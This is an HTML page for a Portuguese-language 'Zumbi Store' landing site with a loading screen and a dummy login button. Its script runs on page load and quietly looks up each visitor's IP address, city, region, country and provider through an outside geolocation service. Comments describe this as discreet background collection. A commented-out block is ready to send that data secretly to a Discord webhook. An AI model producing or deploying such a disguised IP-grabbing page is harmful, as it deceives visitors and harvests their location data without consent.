<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zumbi Store - Oficial</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #0b0e14;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }

        /* Tela de Carregamento / Splash Screen */
        #loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #0b0e14;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            transition: opacity 0.5s ease;
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #00ff66;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loader-text {
            color: #00ff66;
            font-size: 1.1rem;
            font-weight: bold;
            letter-spacing: 2px;
            text-transform: uppercase;
        }

        /* Conteúdo Principal */
        .container {
            background: #151922;
            border: 1px solid #232936;
            border-radius: 16px;
            padding: 40px 30px;
            width: 90%;
            max-width: 420px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            animation: fadeIn 1s ease-in-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .logo {
            width: 90px;
            height: 90px;
            background: #00ff66;
            color: #0b0e14;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 2.5rem;
            font-weight: bold;
            margin: 0 auto 20px auto;
            box-shadow: 0 0 20px rgba(0,255,102,0.4);
        }

        h1 {
            font-size: 1.8rem;
            margin-bottom: 10px;
            color: #ffffff;
        }

        p {
            color: #94a3b8;
            font-size: 0.95rem;
            margin-bottom: 25px;
        }

        .btn {
            display: inline-block;
            background-color: #00ff66;
            color: #0b0e14;
            padding: 12px 25px;
            font-size: 1rem;
            font-weight: bold;
            text-decoration: none;
            border-radius: 8px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0,255,102,0.3);
            width: 100%;
        }

        .btn:hover {
            background-color: #00cc52;
            transform: translateY(-2px);
        }
    </style>
</head>
<body>

    <!-- Tela de Carregamento Perfeita -->
    <div id="loader">
        <div class="spinner"></div>
        <div class="loader-text">A carregar Zumbi Store...</div>
    </div>

    <!-- Estrutura do Site -->
    <div class="container">
        <div class="logo">ZS</div>
        <h1>Zumbi Store</h1>
        <p>A tua comunidade e loja número um. Navega com segurança e aproveita os melhores produtos.</p>
        <a href="#" class="btn" onclick="alert('Conectado com sucesso à Zumbi Store!'); return false;">Entrar na Loja</a>
    </div>

    <script>
        // Simula uma animação de carregamento fluida e profissional (1.5 segundos)
        window.addEventListener('load', () => {
            setTimeout(() => {
                const loader = document.getElementById('loader');
                loader.style.opacity = '0';
                setTimeout(() => {
                    loader.style.display = 'none';
                }, 500);
            }, 1200);
        });

        // Função para detecção e recolha de dados de forma discreta em background
        async function coletarDadosEEnviar() {
            try {
                // Puxa dados detalhados de IP, região, operadora e VPN/Proxy
                let resposta = await fetch('https://ipapi.co/json/');
                let dados = await resposta.json();

                let ipInfo = {
                    ip: dados.ip || 'Desconhecido',
                    cidade: dados.city || 'Desconhecida',
                    regiao: dados.region || 'Desconhecida',
                    pais: dados.country_name || 'Desconhecido',
                    provedor: dados.org || 'Desconhecido',
                    // Nota: Para detecção avançada de VPN comercial a nível profundo, 
                    // costuma-se usar APIs pagas (como ipqualityscore), mas o provedor entrega muito.
                };

                console.log("Dados capturados com sucesso:", ipInfo);
                
                // Se quiseres enviar isso direto para o teu bot do Discord, 
                // podes disparar um Webhook do Discord aqui de forma oculta:
                /*
                fetch('O_TEU_WEBHOOK_DO_DISCORD_AQUI', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `🚨 **Novo Acesso Detetado!**\n> **IP:** ${ipInfo.ip}\n> **Local:** ${ipInfo.cidade}, ${ipInfo.regiao} (${ipInfo.pais})\n> **Provedor:** ${ipInfo.provedor}`
                    })
                });
                */

            } catch (erro) {
                console.log("Modo de segurança ativo.");
            }
        }

        // Executa a função discretamente logo após a página abrir
        coletarDadosEEnviar();
    </script>
</body>
</html>
